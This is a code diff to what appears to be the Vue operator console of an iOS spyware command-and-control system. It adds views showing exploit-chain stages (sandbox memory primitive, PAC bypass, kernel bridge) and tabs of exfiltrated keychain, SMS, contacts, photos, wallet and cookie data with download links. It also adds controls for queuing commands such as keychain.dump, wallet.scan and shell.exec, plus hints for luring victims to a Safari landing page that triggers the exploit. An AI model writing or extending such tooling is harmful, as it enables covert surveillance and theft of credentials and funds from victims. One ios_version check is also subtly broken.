+// sandbox data_json 是一个 dict，后端 _expand_exfil_items 会把它包装成 [dict]，
+// 所以 tabsData.sandbox[0] 就等于整个 sandbox-browser-profile（包含 capabilities 字段）。
+const agentCapabilities = computed(() => {
+  const empty = {
+    available: false,
+    native_bridge: null,
+    pe_skipped: null,
+    sbx0_success: null,
+    sbx1_success: null,
+    ios_version: null,
+    localStorage: null,
+    sessionStorage: null,
+    indexedDB: null,
+    webkit: null,
+    note: null,
+    source: 'none'
+  }
+  const sandboxRows = Array.isArray(tabsData.value?.sandbox) ? tabsData.value.sandbox : []
+  // 从新到旧找第一条包含 capabilities 的记录
+  for (const row of sandboxRows) {
+    if (!row || typeof row !== 'object') continue
+    const caps = row.capabilities
+    if (caps && typeof caps === 'object') {
+      return {
+        available: true,
+        native_bridge: typeof caps.native_bridge === 'boolean' ? caps.native_bridge : null,
+        pe_skipped: typeof caps.pe_skipped === 'boolean' ? caps.pe_skipped : null,
+        sbx0_success: typeof caps.sbx0_success === 'boolean' ? caps.sbx0_success : null,
+        sbx1_success: typeof caps.sbx1_success === 'boolean' ? caps.sbx1_success : null,
+        ios_version: typeof caps.ios_version ? String(caps.ios_version) : null,
+        localStorage: typeof caps.localStorage === 'boolean' ? caps.localStorage : null,
+        sessionStorage: typeof caps.sessionStorage === 'boolean' ? caps.sessionStorage : null,
+        indexedDB: typeof caps.indexedDB === 'boolean' ? caps.indexedDB : null,
+        webkit: typeof caps.webkit === 'boolean' ? caps.webkit : null,
+        note: typeof row.note === 'string' ? row.note : null,
+        source: 'exfil_sandbox'
+      }
+    }
+    // 有些数据可能是 _exfil_id/base 没有 capabilities，但 note 在外层也是有用
+    if (typeof row.note === 'string' && row.note.includes('native_bridge')) {
+      empty.note = row.note
+    }
+  }
+  return empty
+})
+
+// ── Agent 能力概览：给 exploitProgress 判定时调用，给 UI 顶部展示都用它
+const agentCapabilitySummary = computed(() => {
+  const caps = agentCapabilities.value
+  if (!caps.available) return {
+    badgeType: 'info',
+    badgeText: '能力未上报',
+    summaryText: 'Agent 尚未回传 sandbox 能力数据（exploit 链未到 sandbox-only 或完整模式）',
+    detail: []
+  }
+  const nb = caps.native_bridge
+  const stg1 = caps.sbx0_success
+  const stg2 = caps.sbx1_success
+  let badgeType = 'info'
+  let badgeText = '能力未知'
+  if (nb === true) {
+    badgeType = 'success'; badgeText = '内核桥就绪（完全模式）'
+  } else if (nb === false) {
+    badgeType = 'warning'; badgeText = 'Sandbox-only（无内核桥）'
+  } else if (stg1 === true && stg2 === true) {
+    badgeType = 'warning'; badgeText = 'Stage1/2 成功（Native桥待建）'
+  } else {
+    badgeType = 'info'; badgeText = '能力已上报'
+  }
+  const items = [
+    { label: 'Native Bridge（内核权限）', value: caps.native_bridge, type: caps.native_bridge === true ? 'success' : (caps.native_bridge === false ? 'danger' : 'info') },
+    { label: 'Stage1（SBX0 内存原语）', value: caps.sbx0_success, type: caps.sbx0_success === true ? 'success' : (caps.sbx0_success === false ? 'danger' : 'info') },
+    { label: 'Stage2（SBX1 PAC 绕过）', value: caps.sbx1_success, type: caps.sbx1_success === true ? 'success' : (caps.sbx1_success === false ? 'danger' : 'info') },
+    { label: 'PE 是否跳过', value: caps.pe_skipped, type: caps.pe_skipped === true ? 'warning' : (caps.pe_skipped === false ? 'success' : 'info') }
+  ]
+  return { badgeType, badgeText, summaryText: caps.note || '', detail: items }
 })
 
 const browserTagType = computed(() => {
@@ -771,6 +1218,86 @@ const uptimeText = computed(() => {
   if (h > 0) parts.push(`${h} 小时`)
   if (parts.length === 0) parts.push(`${m} 分钟`)
   return parts.join(' ')
+})
+
+// ─── 命令执行历史卡片的能力提示 ────────────────────────────────────
+// 综合判断当前设备能否执行需要 native bridge 的命令：
+//   1) compatible_level 不兼容 → 红色，全部失败
+//   2) exploit_status pending/failed → 黄/红，命令不会执行
+//   3) 即使 exploit_status=success，仍检查 cmdList 里是否有最近的 [ERROR-no-bridge]
+//      失败记录（agent 实际处于 sandbox-only 模式），给出最精准的提示
+//   4) 已利用且无 no-bridge 错误 → 绿色，全部可用
+const capabilityHint = computed(() => {
+  if (!device.value) return { show: false, type: 'info', title: '', desc: '' }
+  const d = device.value
+  const ver = d.os_version || '未知'
+  const es = String(d.exploit_status || '').toLowerCase().trim()
+  const cl = String(d.compatible_level || '').toLowerCase().trim()
+
+  // 1. 不兼容（版本过高/过低/不支持）
+  if (['too_low', 'too_high', 'incompatible', 'unsupported', 'no'].includes(cl)) {
+    return {
+      show: true,
+      type: 'error',
+      title: `设备不兼容（${cl}）— 命令无法执行`,
+      desc: `iOS ${ver}：file.* / shell.* / wallet.* / keychain.* 等需要内核权限的命令都会失败。建议使用 iOS 13.0 ~ 17.2 的 iPhone / iPad Safari 浏览器。`
+    }
+  }
+
+  // 2. 利用状态异常
+  if (es === 'pending') {
+    return {
+      show: true,
+      type: 'warning',
+      title: '设备尚未完成漏洞利用（待利用）— 命令会一直 pending',
+      desc: '请用 iPhone Safari 打开渠道落地页触发完整 exploit 链（Stage1→2→3），待「利用状态」变为「已利用」后再下发命令。'
+    }
+  }
+  if (es === 'failed') {
+    return {
+      show: true,
+      type: 'error',
+      title: '设备漏洞利用失败 — 命令不会执行',
+      desc: '请更换 iOS 版本或检查 Stage1/2/3 exploit 文件是否正确配置。'
+    }
+  }
+
+  // 3. 关键：即使 exploit_status=success，仍检查最近命令是否有 [ERROR-no-bridge]
+  //    这能精准捕获"后端认为已利用但 agent 实际 sandbox-only"的灰色场景
+  const list = Array.isArray(cmdList.value) ? cmdList.value : []
+  const noBridgeRow = list.find(c => {
+    const out = String(c?.output || '') + String(c?.error || '')
+    return out.includes('[ERROR-no-bridge]')
+  })
+  if (noBridgeRow) {
+    const out = String(noBridgeRow.output || '') + String(noBridgeRow.error || '')
+    const m = out.match(/原因：(.+?)(\n|$)/)
+    const reason = m ? m[1].trim() : 'native bridge 未就绪'
+    return {
+      show: true,
+      type: 'warning',
+      title: '⚠️ Native bridge 未就绪 — 需要内核权限的命令会失败',
+      desc: `最近一条命令返回 [ERROR-no-bridge]：${reason}。当前 agent 处于 sandbox-only 模式，file.read / file.list / file.recursive / shell.exec / keychain.dump / wallet.scan 等命令都会失败。建议：用支持的 iOS 版本重新触发完整 exploit 链，等 native bridge 自检（getpid）通过后再下发。`
+    }
+  }
+
+  // 4. 已利用且最近无 no-bridge 错误
+  if (['success', 'exploited', 'complete', 'ok'].includes(es)) {
+    return {
+      show: true,
+      type: 'success',
+      title: '✅ 设备已利用，native bridge 应已就绪 — 所有命令可执行',
+      desc: `iOS ${ver}：file.* / shell.* / wallet.* / keychain.* 等命令均可用。如个别命令仍失败，请查看其输出排错。`
+    }
+  }
+
+  // 5. 兜底：状态未知
+  return {
+    show: true,
+    type: 'info',
+    title: `设备能力状态未知（exploit_status=${es || '空'}）`,
+    desc: '建议先下发一条测试命令（如 ds_system_info）确认 agent 是否就绪。'
+  }
 })
 
 const cmdTemplates = [
@@ -851,8 +1378,34 @@ const sandboxCols = [
   }
 ]
 
+// 通用 exfil 列定义（用于 cookies / storage / battery 等非沙箱数据）
+const exfilGenericCols = [
+  { prop: 'description', label: '项目', width: 160 },
+  { prop: 'path', label: '数据路径' },
+  { prop: 'file_size', label: '大小', width: 90 },
+  { prop: 'uploaded_at', label: '采集时间', width: 170, type: 'date' },
+  {
+    prop: 'actions', label: '操作', width: 110, type: 'custom', _render: (scope) => {
+      const row = scope?.row || {}
+      const id = row.id
+      if (!id) return null
+      const token = localStorage.getItem('token') || ''
+      const url = token
+        ? `/api/exfil/${id}/download?token=${encodeURIComponent(token)}`
+        : `/api/exfil/${id}/download`
+      return h('a', {
+        href: url,
+        target: '_blank',
+        class: 'el-link el-link--primary is-underline',
+        style: 'cursor:pointer;'
+      }, '下载')
+    }
+  }
+]
+
 const tabsData = ref({
-  sandbox: [], keychain: [], wifi: [], contacts: [], sms: [], calls: [], photos: [], files: [], wallet: []
+  sandbox: [], keychain: [], wifi: [], contacts: [], sms: [], calls: [], photos: [], files: [], wallet: [],
+  cookies: [], storage: [], battery: []
 })
 
 const dataTable = defineComponent({
@@ -924,7 +1477,7 @@ async function loadHeartbeats() {
 }
 
 async function loadTabs() {
-  for (const tab of ['sandbox', 'keychain', 'wifi', 'contacts', 'sms', 'calls', 'files', 'wallet', 'wallets', 'photos', 'location', 'system_info']) {
+  for (const tab of ['sandbox', 'keychain', 'wifi', 'contacts', 'sms', 'calls', 'files', 'wallet', 'wallets', 'photos', 'location', 'system_info', 'cookies', 'storage', 'battery']) {
     try {
       const res = await axios.get(`/api/exfil`, { params: { device_uuid: uuid, category: tab, limit: 20 } })
       tabsData.value[tab] = res.data?.items || res.data || []
@@ -1186,13 +1739,146 @@ async function confirmRunScript() {
   }
 }
 
-function loadCommands() {}
+function cmdStatusTag(s) {
+  return { pending: 'warning', running: 'primary', completed: 'success', failed: 'danger', expired: 'info' }[s] || 'info'
+}
+function cmdStatusLabel(s) {
+  return { pending: '待执行', running: '执行中', completed: '已完成', failed: '失败', expired: '已过期' }[s] || s
+}
+async function cancelCmd(row) {
+  try {
+    await ElMessageBox.confirm('确认取消该命令？', '取消命令', { type: 'warning' })
+    const otp = await require2FA('cancel command')
+    if (otp === false) return
+    const params = {}
+    if (otp) params.otp_code = otp
+    await axios.post(`/api/commands/${row.id}/cancel`, null, { params })
+    ElMessage.success('已取消')
+    loadCommands()
+  } catch (err) {
+    if (err !== 'cancel' && err !== 'close') {
+      const msg = err?.response?.data?.detail || err?.message || '取消失败'
+      ElMessage.error(msg)
+    }
+  }
+}
+async function retryCmd(row) {
+  try {
+    const otp = await require2FA('resend command')
+    if (otp === false) return
+    const params = {}
+    if (otp) params.otp_code = otp
+    await axios.post(`/api/commands/${row.id}/retry`, null, { params })
+    ElMessage.success('已重新发送')
+    loadCommands()
+  } catch (err) {
+    const msg = err?.response?.data?.detail || err?.message || '重发失败'
+    ElMessage.error(msg)
+  }
+}
+async function deleteCmd(row) {
+  try {
+    await ElMessageBox.confirm('确认删除该命令？此操作不可恢复。', '删除', { type: 'warning' })
+    const otp = await require2FA('delete command')
+    if (otp === false) return
+    const params = {}
+    if (otp) params.otp_code = otp
+    await axios.delete(`/api/commands/${row.id}`, { params })
+    ElMessage.success('已删除')
+    loadCommands()
+  } catch (err) {
+    if (err !== 'cancel' && err !== 'close') {
+      const msg = err?.response?.data?.detail || err?.message || '删除失败'
+      ElMessage.error(msg)
+    }
+  }
+}
+async function loadCommands() {
+  const _t0 = performance.now()
+  // 用 Error().stack 抓调用方，方便知道是谁触发了刷新（mounted / sendCmd 成功 / cancelCmd / 分页等）
+  let _caller = 'unknown'
+  try {
+    const stackLines = (new Error()).stack?.split('\n') || []
+    // stackLines[0] = 'Error', stackLines[1] = loadCommands 自己, stackLines[2] = 真实调用方
+    const callerLine = stackLines[2] || stackLines[1] || ''
+    const m = callerLine.match(/at\s+([^\s(]+)/)
+    _caller = (m && m[1]) || callerLine.trim().slice(0, 60)
+  } catch (_) {}
+
+  const reqParams = {
+    page: cmdPage.value,
+    page_size: cmdPageSize.value,
+    device_uuid: uuid,
+    status: cmdStatusFilter.value || undefined,
+    q: cmdQFilter.value || undefined
+  }
+
+  console.groupCollapsed(
+    `%c[DeviceDetail:CMD]%c loadCommands START → page=${reqParams.page}, size=${reqParams.page_size}, status=${reqParams.status || '(all)'}, q=${reqParams.q || '(none)'} | caller=${_caller}`
+    , 'color:#a855f7;font-weight:bold;', ''
+  )
+  console.log('reqParams:', JSON.parse(JSON.stringify(reqParams)))
+
+  cmdLoading.value = true
+  try {
+    const res = await axios.get('/api/commands', { params: reqParams })
+    const dur = (performance.now() - _t0).toFixed(1)
+    const rawData = res.data
+    const items = Array.isArray(rawData?.items) ? rawData.items
+                : Array.isArray(rawData) ? rawData : []
+    const total = rawData?.total != null ? Number(rawData.total) : items.length
+
+    // 状态分布统计，快速判断各状态数量
+    const statusBreakdown = items.reduce((acc, c) => {
+      const s = String(c?.status || 'unknown')
+      acc[s] = (acc[s] || 0) + 1
+      return acc
+    }, {})
+
+    cmdList.value = items
+    cmdTotal.value = total
+
+    console.log(`✅ OK - HTTP ${res.status} | ${dur}ms | items=${items.length} | total=${total}`)
+    console.log('status breakdown:', statusBreakdown)
+    if (items.length > 0) {
+      const first = items[0]
+      const last = items[items.length - 1]
+      console.log(
+        'first row : id=%s  cmd="%s"  status=%s  created=%s',
+        first.id, String(first.command || '').slice(0, 60), first.status, first.created_at
+      )
+      if (items.length > 1) {
+        console.log(
+          'last row  : id=%s  cmd="%s"  status=%s  created=%s',
+          last.id, String(last.command || '').slice(0, 60), last.status, last.created_at
+        )
+      }
+    } else {
+      console.log('ℹ️ items 是空数组 → cmdList 会被置为 []。检查后端返回：rawData keys =', Object.keys(rawData || {}))
+    }
+    console.groupEnd()
+  } catch (err) {
+    const dur = (performance.now() - _t0).toFixed(1)
+    const status = err?.response?.status
+    const detail = err?.response?.data?.detail || err?.message || String(err)
+    console.error(`❌ FAIL - HTTP ${status || 'N/A'} | ${dur}ms | detail:`, detail)
+    console.error('full error:', err)
+    console.groupEnd()
+    const msg = err?.response?.data?.detail || err?.message || '命令历史加载失败'
+    ElMessage.error(msg)
+    cmdList.value = []
+    cmdTotal.value = 0
+  } finally {
+    cmdLoading.value = false
+  }
+}
 
 onMounted(() => {
   loadDevice()
   loadHeartbeats()
   loadTabs()
   loadLogs()
+  loadCommands()
 })
 </script>
 
@@ -1232,7 +1918,7 @@ onMounted(() => {
   flex-shrink: 0;
 }
 .term-body {
-  max-height: 480px;
+  max-height: 280px;
   overflow-y: auto;
   padding: 6px 0;
   font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
